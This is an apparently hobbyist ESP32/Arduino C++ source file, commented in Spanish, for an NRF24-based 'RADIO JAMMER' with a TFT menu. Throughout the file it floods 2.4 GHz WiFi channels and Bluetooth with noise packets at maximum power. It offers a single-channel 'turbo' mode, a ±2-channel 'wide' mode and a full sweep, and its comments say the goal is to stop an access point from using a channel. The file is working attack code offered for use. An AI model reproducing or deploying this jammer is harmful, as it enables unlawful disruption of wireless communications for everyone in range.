#include "RadioJammer.h"
#include <RF24.h>
#include <SPI.h>
#include "Pins.h"

extern TFT_eSPI tft;

static RF24 radioJam(CE_PIN, CSN_PIN);

// ── Canal WiFi seleccionado (1-13) ────────────────────────────────────────────
static int jamChannel = 6;

// ── Tabla: canal WiFi → offset NRF24 (base 2400 MHz) ─────────────────────────
static const uint8_t wifiToNrf[14] = {
    0,  12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72
};

// ── Payload de ruido máximo 32 bytes ─────────────────────────────────────────
static const uint8_t noise_payload[32] = {
    0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA,
    0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA,
    0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA,
    0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA
};

// ── Solo los 14 canales WiFi 2.4GHz (centros exactos en offset NRF24) ─────────
// Menos canales = más tiempo por canal = mayor saturación efectiva
static const uint8_t sweep_list[] = {
    12,  // WiFi CH1  → 2412 MHz
    17,  // WiFi CH2  → 2417 MHz
    22,  // WiFi CH3  → 2422 MHz
    27,  // WiFi CH4  → 2427 MHz
    32,  // WiFi CH5  → 2432 MHz
    37,  // WiFi CH6  → 2437 MHz
    42,  // WiFi CH7  → 2442 MHz
    47,  // WiFi CH8  → 2447 MHz
    52,  // WiFi CH9  → 2452 MHz
    57,  // WiFi CH10 → 2457 MHz
    62,  // WiFi CH11 → 2462 MHz
    67,  // WiFi CH12 → 2467 MHz
    72,  // WiFi CH13 → 2472 MHz
    84   // WiFi CH14 → 2484 MHz (Japón)
};
static const int sweep_total = sizeof(sweep_list);

// ─────────────────────────────────────────────────────────────────────────────
// Inicializa el NRF24 reiniciando el bus SPI limpiamente
// ─────────────────────────────────────────────────────────────────────────────
static bool initRadio() {
    SPI.end();
    delay(20);
    SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN);
    delay(20);
    if (!radioJam.begin()) return false;
    radioJam.setPALevel(RF24_PA_MAX);
    radioJam.setDataRate(RF24_2MBPS);
    radioJam.setCRCLength(RF24_CRC_DISABLED);
    radioJam.setAutoAck(false);
    radioJam.setRetries(0, 0);
    radioJam.setAddressWidth(3);
    radioJam.openWritingPipe((uint8_t*)"JAM");
    radioJam.stopListening();
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// Animación de barras
// ─────────────────────────────────────────────────────────────────────────────
static void drawBars() {
    int baseY = 205;
    int areaH = 30;
    tft.fillRect(10, baseY - areaH, 300, areaH, TFT_BLACK);
    for (int x = 15; x < 310; x += 4) {
        int h = random(3, areaH);
        tft.drawFastVLine(x, baseY - h, h, h > areaH / 2 ? TFT_RED : TFT_YELLOW);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  NÚCLEOS DE ATAQUE
//
//  attackTurbo()  — Máxima densidad en un solo canal.
//                   Todo el tiempo del radio concentrado en el canal exacto.
//                   Más efectivo para tumbar un canal WiFi específico.
//
//  attackWide()   — Canal central ±2 (5 canales NRF = ~10 MHz de ancho).
//                   Balance entre cobertura y densidad.
//                   Útil si el AP salta entre canales adyacentes.
//
//  attackSweep()  — Recorre toda la lista de canales WiFi + BT.
//                   Menor densidad por canal pero cobertura total.
// ─────────────────────────────────────────────────────────────────────────────

// Turbo: 500 paquetes seguidos en un solo canal — máxima saturación
static void attackTurbo(uint8_t nrfChannel) {
    radioJam.setChannel(nrfChannel);
    for (int i = 0; i < 500; i++)
        radioJam.startWrite(noise_payload, 32, true);
}

// Wide: ±2 canales NRF alrededor del centro (5 canales total, ~10 MHz BW)
// Cada canal recibe 100 paquetes → densidad alta con algo de cobertura lateral
static void attackWide(uint8_t center) {
    for (int offset = -2; offset <= 2; offset++) {
        int ch = (int)center + offset;
        if (ch < 0 || ch > 125) continue;
        radioJam.setChannel((uint8_t)ch);
        for (int i = 0; i < 100; i++)
            radioJam.startWrite(noise_payload, 32, true);
    }
}

// Sweep: ataca cada canal con BURST_PER_CH paquetes antes de pasar al siguiente.
// Recorre un canal completo por llamada para que el analizador lo detecte
// y el AP no pueda usarlo durante el tiempo de ataque en ese canal.
#define SWEEP_BURST_PER_CH 80
static void attackSweepStep(int& idx) {
    // Atacar el canal actual con densidad alta
    radioJam.setChannel(sweep_list[idx]);
    for (int i = 0; i < SWEEP_BURST_PER_CH; i++)
        radioJam.startWrite(noise_payload, 32, true);
    // Avanzar al siguiente canal
    idx = (idx + 1) % sweep_total;
}

// ─────────────────────────────────────────────────────────────────────────────
// MODO 1: Canal WiFi fijo — tres sub-modos de ataque seleccionables
//
// Navegación (sin atacar):
//   UP/DOWN   → cambia canal WiFi
//   OK        → si foco en canal → cicla modo de ataque (OFF→TURBO→WIDE→OFF)
//               si foco en BACK  → vuelve al menú del jammer
//   DOWN en canal 1 → mueve foco a BACK
//   UP en BACK      → mueve foco a canal
// ─────────────────────────────────────────────────────────────────────────────
static void runChannelJammer() {
    // attackMode: 0=OFF, 1=TURBO (concentrado), 2=WIDE (±2 canales)
    int     attackMode = 0;
    bool    exitMode   = false;
    int     sel        = 0;   // 0=foco canal, 1=foco BACK

    const char* modeLabels[] = { "OFF", "TURBO", "WIDE" };
    const uint16_t modeColors[] = { TFT_GREEN, TFT_RED, TFT_ORANGE };

    auto redraw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, TFT_WHITE);

        // Cabecera — color según modo activo
        uint16_t hdrBg = (attackMode == 0) ? TFT_WHITE :
                         (attackMode == 1) ? TFT_RED : 0xFBE0; // naranja oscuro
        tft.fillRect(1, 1, 318, 42, hdrBg);

        if (attackMode == 0)
            drawStringCustom(10, 10, "CANAL FIJO", TFT_BLACK, 3);
        else if (attackMode == 1)
            drawStringCustom(10, 10, "TURBO JAM!", TFT_WHITE, 3);
        else
            drawStringCustom(10, 10, "WIDE  JAM!", TFT_WHITE, 3);

        // Canal seleccionado
        uint16_t chBg = (sel == 0 && attackMode == 0) ? TFT_WHITE : TFT_BLACK;
        uint16_t chFg = (sel == 0 && attackMode == 0) ? TFT_BLACK : TFT_YELLOW;
        tft.fillRect(5, 50, 310, 28, chBg);
        drawStringCustom(10, 56,
            "CH " + String(jamChannel) + "  " +
            String(2412 + (jamChannel - 1) * 5) + " MHz",
            chFg, 2);

        // Modo de ataque actual
        drawStringCustom(10, 88, "MODO: ", TFT_WHITE, 2);
        drawStringCustom(80, 88, modeLabels[attackMode], modeColors[attackMode], 2);

        // Info según modo
        if (attackMode == 0) {
            drawStringCustom(10, 115, "OK: TURBO → WIDE → OFF", UI_ACCENT, 1);
        } else if (attackMode == 1) {
            drawStringCustom(10, 115, "500 pkt/iter canal exacto", TFT_RED, 1);
            drawStringCustom(10, 132, "Maxima densidad. 1 canal.", TFT_RED, 1);
        } else {
            drawStringCustom(10, 115, "100 pkt x 5 canales (+/-2)", TFT_ORANGE, 1);
            drawStringCustom(10, 132, "Cubre ~10 MHz de ancho.", TFT_ORANGE, 1);
        }

        // Botón BACK (visible solo si no ataca)
        if (attackMode == 0) {
            uint16_t bBg = (sel == 1) ? TFT_WHITE : TFT_BLACK;
            uint16_t bFg = (sel == 1) ? TFT_BLACK : TFT_WHITE;
            tft.fillRect(5, 155, 120, 30, bBg);
            tft.drawRect(5, 155, 120, 30, TFT_WHITE);
            drawStringCustom(14, 163, "< BACK", bFg, 2);
        }

        tft.drawFastHLine(0, 215, 320, TFT_WHITE);
        if (attackMode == 0)
            drawStringCustom(5, 220, "UP/DOWN:CANAL/NAV  OK:SELEC", UI_ACCENT, 1);
        else
            drawStringCustom(5, 220, "UP/DOWN:CANAL  OK:CAMBIAR MODO", UI_ACCENT, 1);
    };

    redraw();

    while (!exitMode) {

        // ── UP ──────────────────────────────────────────────────────────────
        if (digitalRead(BTN_UP) == LOW) {
            if (sel == 1) {
                sel = 0;          // BACK → foco canal
            } else if (jamChannel < 13) {
                jamChannel++;
            }
            redraw();
            delay(200);
        }

        // ── DOWN ─────────────────────────────────────────────────────────────
        if (digitalRead(BTN_DOWN) == LOW) {
            if (attackMode > 0) {
                // Atacando: DOWN baja canal
                if (jamChannel > 1) jamChannel--;
            } else if (sel == 0 && jamChannel > 1) {
                jamChannel--;
            } else if (sel == 0 && jamChannel == 1) {
                sel = 1;          // canal mínimo sin atacar → mover a BACK
            }
            redraw();
            delay(200);
        }

        // ── OK ───────────────────────────────────────────────────────────────
        if (digitalRead(BTN_OK) == LOW) {
            if (sel == 1 && attackMode == 0) {
                // BACK seleccionado
                exitMode = true;
                delay(200);
                break;
            } else {
                // Ciclar modo: OFF → TURBO → WIDE → OFF
                attackMode = (attackMode + 1) % 3;
                sel = 0;
                redraw();
                delay(300);
            }
        }

        // ── ATAQUE ───────────────────────────────────────────────────────────
        if (attackMode == 1) {
            attackTurbo(wifiToNrf[jamChannel]);
            drawBars();
        } else if (attackMode == 2) {
            attackWide(wifiToNrf[jamChannel]);
            drawBars();
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// MODO 2: Barrido total WiFi + Bluetooth
// ─────────────────────────────────────────────────────────────────────────────
static void runSweepJammer() {
    bool isAttacking = false;
    bool exitMode    = false;
    int  sel         = 0;   // 0=INICIAR, 1=BACK
    int  sweepIdx    = 0;
    int  animCtr     = 0;

    auto redraw = [&]() {
        tft.fillScreen(TFT_BLACK);
        tft.drawRect(0, 0, 320, 240, TFT_WHITE);

        tft.fillRect(1, 1, 318, 42, isAttacking ? TFT_RED : TFT_WHITE);
        drawStringCustom(10, 10, isAttacking ? "BARRIDO ACTIVO" : "BARRIDO TOTAL",
                         isAttacking ? TFT_WHITE : TFT_BLACK, 2);

        if (isAttacking) {
            drawStringCustom(10, 55, "WiFi CH1-13 + Bluetooth", TFT_RED, 2);
            drawStringCustom(10, 80, String(sweep_total) + " canales en bucle", TFT_YELLOW, 2);
        } else {
            drawStringCustom(10, 55, "WiFi 2.4GHz + Bluetooth", TFT_WHITE, 2);
            drawStringCustom(10, 80, "ESTADO: LISTO", TFT_GREEN, 2);

            uint16_t iBg = (sel == 0) ? TFT_WHITE : TFT_BLACK;
            tft.fillRect(5, 115, 140, 30, iBg);
            tft.drawRect(5, 115, 140, 30, TFT_WHITE);
            drawStringCustom(14, 123, ">> INICIAR", sel == 0 ? TFT_BLACK : TFT_WHITE, 2);

            uint16_t bBg = (sel == 1) ? TFT_WHITE : TFT_BLACK;
            tft.fillRect(5, 155, 120, 30, bBg);
            tft.drawRect(5, 155, 120, 30, TFT_WHITE);
            drawStringCustom(14, 163, "< BACK", sel == 1 ? TFT_BLACK : TFT_WHITE, 2);
        }

        tft.drawFastHLine(0, 215, 320, TFT_WHITE);
        drawStringCustom(5, 220,
            isAttacking ? "OK: PARAR ATAQUE" : "UP/DOWN: MOVER  OK: SELEC",
            UI_ACCENT, 1);
    };

    redraw();

    while (!exitMode) {
        if (isAttacking) {
            attackSweepStep(sweepIdx);

            // Redibujar barra y canal cada 5 canales para feedback visual fluido
            if (++animCtr >= 5) {
                animCtr = 0;
                drawBars();
                // Mostrar canal NRF actual en tiempo real
                tft.fillRect(10, 155, 250, 18, TFT_BLACK);
                drawStringCustom(10, 157,
                    "NRF CH: " + String(sweep_list[sweepIdx]) +
                    "  (" + String(sweepIdx + 1) + "/" + String(sweep_total) + ")",
                    TFT_CYAN, 2);
            }
            if (digitalRead(BTN_OK) == LOW) {
                isAttacking = false;
                sel = 0;
                redraw();
                delay(300);
            }
        } else {
            if (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
                sel = sel == 0 ? 1 : 0;
                redraw();
                delay(200);
            }
            if (digitalRead(BTN_OK) == LOW) {
                if (sel == 0) {
                    isAttacking = true;
                    sweepIdx = 0;
                    animCtr  = 0;
                    redraw();
                    delay(400);
                } else {
                    exitMode = true;
                    delay(200);
                }
            }
            delay(10);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Menú principal del jammer (0=Canal Fijo, 1=Barrido, 2=Back)
// ─────────────────────────────────────────────────────────────────────────────
static void drawModeMenu(int sel) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_WHITE);
    drawStringCustom(20, 10, "RADIO JAMMER", TFT_WHITE, 3);
    tft.drawFastHLine(0, 45, 320, TFT_WHITE);

    tft.fillRect(10, 52,  300, 46, sel == 0 ? TFT_WHITE : TFT_BLACK);
    tft.drawRect( 10, 52,  300, 46, TFT_WHITE);
    drawStringCustom(20, 58,  "1. CANAL FIJO",          sel == 0 ? TFT_BLACK : TFT_WHITE, 2);
    drawStringCustom(20, 82,  "TURBO o WIDE por canal",  sel == 0 ? TFT_BLACK : UI_ACCENT, 1);

    tft.fillRect(10, 106, 300, 46, sel == 1 ? TFT_WHITE : TFT_BLACK);
    tft.drawRect( 10, 106, 300, 46, TFT_WHITE);
    drawStringCustom(20, 112, "2. BARRIDO TOTAL",        sel == 1 ? TFT_BLACK : TFT_WHITE, 2);
    drawStringCustom(20, 136, "WiFi + Bluetooth 2.4GHz", sel == 1 ? TFT_BLACK : UI_ACCENT, 1);

    tft.fillRect(10, 160, 300, 38, sel == 2 ? TFT_WHITE : TFT_BLACK);
    tft.drawRect( 10, 160, 300, 38, TFT_WHITE);
    drawStringCustom(20, 172, "< BACK AL MENU PRINCIPAL", sel == 2 ? TFT_BLACK : TFT_WHITE, 2);

    tft.drawFastHLine(0, 210, 320, TFT_WHITE);
    drawStringCustom(10, 218, "UP/DOWN: MOVER   OK: ENTRAR", UI_ACCENT, 1);
}

// ─────────────────────────────────────────────────────────────────────────────
// Punto de entrada público
// ─────────────────────────────────────────────────────────────────────────────
void runRadioJammer() {
    if (!initRadio()) {
        tft.fillScreen(TFT_BLACK);
        drawStringCustom(20, 90,  "NRF24 ERROR", TFT_RED, 3);
        drawStringCustom(10, 130, "Revisa conexion SPI", TFT_WHITE, 2);
        drawStringCustom(10, 155, "CE:21 CSN:32 SCK:25", UI_ACCENT, 1);
        drawStringCustom(10, 172, "MISO:26 MOSI:33",     UI_ACCENT, 1);
        delay(4000);
        return;
    }

    bool exitJammer = false;

    while (!exitJammer) {
        int  menuSel  = 0;
        bool menuDone = false;

        drawModeMenu(menuSel);

        while (!menuDone) {
            if (digitalRead(BTN_UP) == LOW) {
                menuSel = (menuSel == 0) ? 2 : menuSel - 1;
                drawModeMenu(menuSel);
                delay(200);
            }
            if (digitalRead(BTN_DOWN) == LOW) {
                menuSel = (menuSel == 2) ? 0 : menuSel + 1;
                drawModeMenu(menuSel);
                delay(200);
            }
            if (digitalRead(BTN_OK) == LOW) {
                menuDone = true;
                delay(300);
            }
            delay(10);
        }

        if      (menuSel == 2) exitJammer = true;
        else if (menuSel == 0) runChannelJammer();
        else                   runSweepJammer();
    }

    radioJam.powerDown();
    SPI.end();
}